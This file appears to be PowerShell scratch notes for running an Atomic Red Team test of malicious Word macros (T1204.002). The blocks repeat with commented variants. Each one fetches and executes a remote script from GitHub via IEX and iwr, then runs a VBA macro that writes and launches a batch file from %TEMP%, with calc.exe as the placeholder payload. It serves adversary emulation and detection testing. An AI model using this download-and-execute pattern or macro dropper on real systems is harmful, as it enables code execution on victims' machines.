[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
# $macrocode = '   Open "env:temp\art1204.bat" For Output As #1`n   Write #1, "calc.exe"`n   Close #1`n   a = Shell("cmd.exe /c env:temp\art1204.bat", vbNormalFocus)`n'
# $macrocode = "Open `"env:temp\art1204.bat`" For Output As #1`nWrite #1, `"calc.exe`"`nClose #1`nShell `"cmd.exe /c env:temp\art1204.bat`", vbNormalFocus"
$macrocode = "Dim batPath As String`nbatPath = Environ(`"TEMP`") & `"\art1204.bat`"`nOpen batPath For Output As #1`nWrite #1, `"calc.exe`"`nClose #1`nShell `"cmd.exe /c %TEMP%\art1204.bat`", vbNormalFocus"
$macrocode = "Open Environ(`"TEMP`") &`"\art1204.bat`" For Output As #1`nWrite #1, `"calc.exe`"`nClose #1`nShell `"cmd.exe /c %TEMP%\art1204.bat`", vbNormalFocus"
Invoke-MalDoc -macroCode $macrocode -officeProduct Word




[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"$("$env:temp\art1204.bat")`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $("$env:temp\art1204.bat") `", vbNormalFocus)`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct Word


[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
# $macrocode = '   Open "env:temp\art1204.bat" For Output As #1`n   Write #1, "calc.exe"`n   Close #1`n   a = Shell("cmd.exe /c env:temp\art1204.bat", vbNormalFocus)`n'
# $macrocode = "Open `"env:temp\art1204.bat`" For Output As #1`nWrite #1, `"calc.exe`"`nClose #1`nShell `"cmd.exe /c env:temp\art1204.bat`", vbNormalFocus"
$macrocode = "Dim batPath As String`nbatPath = Environ(`"TEMP`") & `"\art1204.bat`"`nOpen batPath For Output As #1`nWrite #1, `"calc.exe`"`nClose #1`nShell `"cmd.exe /c %TEMP%\art1204.bat`", vbNormalFocus"
$macrocode = "Open Environ(`"TEMP`") &`"\art1204.bat`" For Output As #1`nWrite #1, `"calc.exe`"`nClose #1`nShell `"cmd.exe /c %TEMP%\art1204.bat`", vbNormalFocus"
Invoke-MalDoc -macroCode $macrocode -officeProduct Word

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"$("$env:temp\art1204.bat")`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $("$env:temp\art1204.bat") `", vbNormalFocus)`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct Word
